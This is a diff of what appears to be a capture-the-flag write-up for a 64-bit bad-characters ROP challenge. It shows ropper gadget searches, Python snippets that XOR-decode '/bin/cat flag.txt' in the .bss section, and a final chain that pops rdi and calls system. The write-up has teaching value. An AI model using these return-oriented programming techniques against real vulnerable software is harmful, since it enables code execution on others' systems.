@@ -101,7 +101,7 @@ load_str_3 = pop_r12_r13 + last_bit + p64(data_start+0x10) + mov_r13_r12
 load_str = load_str_1 + load_str_2 + load_str_3
 ```
 
-I'm using .bss`0x601080` instead of .data`0x601070` because the third char for the string would have landed at `0x601073` which ends in a bad char `0x73` aka 's'
+I'm using .bss `0x601080` instead of .data `0x601070` because the third char for the string would have landed at `0x601073` which ends in a bad char `0x73` aka 's'
 
 You could offset it by one and have the start be `0x601071` so then the third char is `0x601074` instead of `0x601073` it really doesn't matter.
 
@@ -129,7 +129,7 @@ ropper --search "pop r14" -b 6269632f20666e73
 
 Now we just need to make a ropchain with the previously used key to xor the string back to `/bin/cat flag.txt`
 
-CODE:
+Code Snip of it all together:
 ```
 key = "D".ljust(8,"\x00").encode() #left justfied so it becomes 8 bytes in length "D\x00\x00\x00\x00\x00\x00\x00"
 pop_r14_r15 = p64(0x400b40)
@@ -161,3 +161,32 @@ xor_str = xor_cat + xor_flag
 Once again run and test this stage of the exploit before moving on. The less to debug is always better.
 
 ![modified string](imgs/64bit/modifiedString.png)
+
+
+#### System Call!
+
+Now we get to feed the address of our string to the system call and get the flag!
+
+Once again using ropper to locate a `pop rdi` since $rdi is the 1st arg in x86\_64 asm code.
+```
+ropper --search "pop rdi" -b 6269632f20666e73
+
+0x0000000000400b39: pop rdi; ret;
+```
+
+And like alwasy there is a `usefulFunction`
+```
+gef> uf usefulFunction  or  disass usefulFunction
+0x00000000004009e8 <+9>:     call   0x4006f0 <system@plt>
+```
+
+Code Snip of it all together:
+```
+system = p64(0x4009e8)
+pop_rdi = p64(0x400b39)
+system_call = pop_rdi + p64(data_start) + system
+
+payload = load_str + xor_str + system_call
+```
+
+![ladies and gentlemen. We got him](imgs/64bit/loaded.png)
